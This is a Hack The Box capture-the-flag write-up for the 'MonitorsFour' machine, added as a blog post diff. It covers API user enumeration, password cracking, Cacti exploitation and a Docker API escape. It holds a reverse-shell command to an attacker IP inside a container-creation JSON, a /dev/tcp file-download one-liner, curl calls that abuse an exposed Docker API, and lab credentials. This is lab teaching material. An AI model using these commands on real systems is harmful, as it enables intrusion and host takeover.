@@ -1,0 +1,255 @@
+---
+title: HTB-MonitorsFour
+published: 2025-12-06
+toc: true
+draft: false
+tags:
+  - "CVE-2025-24367"
+  - "cacti"
+  - "docker"
+  - "docker-escape"
+  - "CVE-2025-9074"
+  - "docker-API"
+---
+
+import PasswordProtect from '~/components/PasswordProtect.client';
+
+```
+Scope:
+10.10.11.98
+```
+
+# Recon
+## Nmap
+
+```bash
+sudo nmap -sC -sV -sT -p- --min-rate=5000 -Pn -T5 -vvvv monitorsfour.htb
+
+PORT     STATE SERVICE REASON  VERSION
+80/tcp   open  http    syn-ack nginx
+| http-methods: 
+|_  Supported Methods: GET
+|_http-title: MonitorsFour - Networking Solutions
+|_http-favicon: Unknown favicon MD5: 889DCABDC39A9126364F6A675AA4167D
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+5985/tcp open  http    syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+<PasswordProtect client:load>
+
+## 80/TCP - HTTP
+
+![](attachments/34d646f6239526a03676d913d34aac53.png)
+
+### gobuster
+
+In order to enumerate the directories I used `gobuster`.
+Amongst the finds was the `.env` file which I looked into:
+
+![](attachments/0f3819219b074b59ec9bcff759cd140e.png)
+
+These credentials did not work for the login, and I tried password spraying with no luck.
+
+I had also enumerated the `/api` endpoint:
+
+![](attachments/ade12080db8b896f62ff8e7a71cb351d.png)
+
+![](attachments/04c2f1b2bf77f8db09f77dead1637b67.png)
+
+I then added the token and got this output:
+
+![](attachments/a5bf24c6deb1e0de037fd3999d30fbf4.png)
+
+Accordingly I added an id and got this output:
+
+![](attachments/eba8c8ae65fbf35d33a2f2d024757173.png)
+
+This meant I could automate and brute force the id's using `ffuf`.
+
+### ffuf
+
+```bash
+ffuf -w <(seq 0 100) -u 'http://monitorsfour.htb/api/v1/user?token=0&id=FUZZ' -fr 'No user'
+```
+
+![](attachments/9f8b3169222fa4025bbe5905039d1a48.png)
+
+I then enumerated all the id's in a `json` output:
+
+```bash
+for i in 6 11 10 7 2; do curl -s "http://monitorsfour.htb/api/v1/user?token=0&id=$i" | jq .; done
+```
+
+![](attachments/6d9c7fd4263b387649552279c249f6eb.png)
+
+I went ahead and cracked the passwords:
+
+![](attachments/c70f7f98b4305e9b2ff2e32e74b763e7.png)
+
+the valid match we were looking for was:
+
+```
+admin
+wonderful1
+```
+
+I used this credential set to log in:
+
+![](attachments/d0aacc97b56adfe1776772c9062f09c1.png)
+
+Nothing was found useful here, moving on.
+
+### cacti.monitorsfour.htb
+
+During my enumeration I had found the `cacti.monitorsfour.htb` vhost and added it to my hosts list.
+
+![](attachments/949a3477b87811982c03099a238a56e8.png)
+
+![](attachments/e18f6f994bc748e0802a898ef8e0e246.png)
+
+I tried password spraying some of the cracked combinations:
+
+![](attachments/46c7d4ea46cdf4048829cdf30a105286.png)
+
+While `admin` didn't work I tried the first name of the `admin` user which was *marcus*:
+
+![](attachments/7ee53af9e60dd9466b75d218ab964a46.png)
+
+This gave me full access!
+
+![](attachments/f6f5c96178d76ebb5ca1482d6247a430.png)
+
+# Foothold
+## CVE-2025-24367
+
+Using [this publicly available PoC]() I went ahead and got a reverse shell on the server:
+
+![](attachments/2e563da27b9e66d5e885e018d39015f6.png)
+
+
+![](attachments/496100b52aa78d47a847d9e395e2502a.png)
+
+### user.txt
+
+![](attachments/c0e763ed4bc59248fb7e4f722c33fb40.png)
+
+Right away I noticed we landed inside of a docker container instead of the actual target.
+
+## Enumeration
+
+In order to transfer over files I used the following commands:
+
+```bash
+export RHOST=10.10.14.9
+export RPORT=80
+export LFILE=linpeas.sh
+bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
+    3<>/dev/tcp/$RHOST/$RPORT \
+    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
+```
+
+![](attachments/546d7812b0f55126629cdfbc6f24de3a.png)
+
+![](attachments/fec0b7f4df0817e49f3556206e845ab9.png)
+
+During the enumeration I found the following:
+
+![](attachments/3a7e8968476d403d94e0b558487da739.png)
+
+```
+cactiuser
+7pyrf6ly8qx4
+```
+
+![](attachments/afd0f4e49cb36dd5fe612e81919e4ff7.png)
+
+I didn't find anything super useful here so instead checked the `/etc/resolv.conf` file in order to find out what the internal interface of the docker host is:
+
+![](attachments/2eaa049b27ef296087f62ee65c07dc76.png)
+
+### docker
+
+Since we know we're inside a `docker` container, and we know what the external host IP is we can use [the following techniques](https://book.hacktricks.wiki/en/network-services-pentesting/2375-pentesting-docker.html?highlight=docker#docker-basics) to enumerate the port:
+
+![](attachments/65ed8634e68d67bf9221a9940dc8e505.png)
+
+I then used the following command to enumerate the `docker` instance running:
+
+```bash
+curl -s http://192.168.65.7:2375/images/json | sed 's/},{/},\n{/g' | sed 's/,/\n  /g'
+```
+
+![](attachments/ef83cf56f01b3a7288c54d444caae2a7.png)
+
+# Privilege Escalation
+## Docker API Escape - CVE-2025-9074
+
+I started doing some enumeration about the `docker` api and how I could escape it and found the following:
+
+![](attachments/609ececa3e657095b593f2bba44f959d.png)
+
+I then checked [this website](https://hackviser.com/tactics/pentesting/services/docker) for useful Docker API commands:
+
+![](attachments/1ef8eb04a267186b268028bfbff1b7a2.png)
+
+The following steps will have to done in order to get a successfull reverse shell:
+
+### Create Container
+
+1. Create a `json` file which will create the container:
+
+```bash
+{
+  "Image": "docker_setup-nginx-php:latest",
+  "Cmd": ["bash","-c","bash -i >& /dev/tcp/10.10.14.9/80 0>&1"],
+  "HostConfig": {
+    "Binds": ["/mnt/host/c:/host_root"]
+  }
+}
+```
+
+2. Create the container:
+
+```bash
+curl -s -H "Content-Type: application/json" \
+  -d @create_container.json \
+  http://192.168.65.7:2375/containers/create > resp.json
+```
+
+3. Check the response file, use this as the id to start the container:
+
+```
+response:
+
+2f2764e2948cbc1ebe3aa5a20458d381e0f975d7d6dc9047ad1811f360120288
+```
+
+```bash
+curl -s -X POST http://192.168.65.7:2375/containers/2f2764e2948cbc1ebe3aa5a20458d381e0f975d7d6dc9047ad1811f360120288/start
+```
+
+4. Check listener:
+
+![](attachments/b740fa8b2d051f9f65e9ece668b14b6f.png)
+
+Once we have a successfull container we can go ahead and read the **Windows** file system: 
+
+![](attachments/bbbfdbddc6fb6b21c8dd9aaa591593d3.png)
+
+### root.txt
+
+The root flag is found in the *Administrator*'s desktop as always:
+
+![](attachments/ce2fb29a26d6017da36b45959015c69e.png)
+
+![](attachments/1888a9a6948173877d31aab9cf2db74a.png)
+
+</PasswordProtect>
+
+---
